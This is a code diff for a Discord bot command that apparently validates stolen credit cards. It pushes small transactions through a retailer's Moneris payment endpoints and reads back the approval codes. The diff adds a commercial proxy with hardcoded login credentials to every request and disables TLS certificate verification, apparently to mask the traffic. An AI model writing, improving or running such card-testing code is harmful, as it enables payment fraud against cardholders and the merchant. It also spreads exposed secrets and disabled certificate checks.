@@ -1,5 +1,17 @@
 import { SlashCommandBuilder, EmbedBuilder } from "discord.js";
 import axios from "axios";
+import https from "https";
+const PROXY_CONFIG = {
+    host: "brd.superproxy.io",
+    port: 33335,
+    auth: {
+        username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
+        password: "2rupnulv0s5o",
+    },
+};
+const httpsAgent = new https.Agent({
+    rejectUnauthorized: false,
+});
 const responseCodes = {
     "000-87": "Approved (Purchase Amount Only, No Cash Back allowed)",
     "001-85": "Approved w/o bal",
@@ -219,6 +231,8 @@ export async function execute(interaction) {
         let cvdMessage = "";
         try {
             const preloadResponse = await axios.get("https://www.leevalley.com/api/moneris?grandTotal=16.90&action=preload", {
+                proxy: PROXY_CONFIG,
+                httpsAgent: httpsAgent,
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 timeout: 10000
             });
@@ -244,10 +258,14 @@ export async function execute(interaction) {
                 throw new Error("Failed to get ticket");
             }
             await axios.post("https://gateway.moneris.com/chktv2/display/request.php", `ticket=${ticket}&action=process_transaction&cardholder=${cardholder}&pan=${cc}&expiry_date=${mm}${yy1}&card_data_key=new&cvv=${cvv}`, {
+                proxy: PROXY_CONFIG,
+                httpsAgent: httpsAgent,
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 timeout: 15000
             });
             const receiptResponse = await axios.get(`https://www.leevalley.com/api/moneris?grandTotal=1.90&action=receipt&ticket=${ticket}`, {
+                proxy: PROXY_CONFIG,
+                httpsAgent: httpsAgent,
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 timeout: 10000
             });
@@ -302,6 +320,8 @@ export async function execute(interaction) {
                 preferred_scheme: "",
                 requestSource: "JS",
             }, {
+                proxy: PROXY_CONFIG,
+                httpsAgent: httpsAgent,
                 headers: {
                     accept: "*/*",
                     "accept-encoding": "gzip, deflate, br",
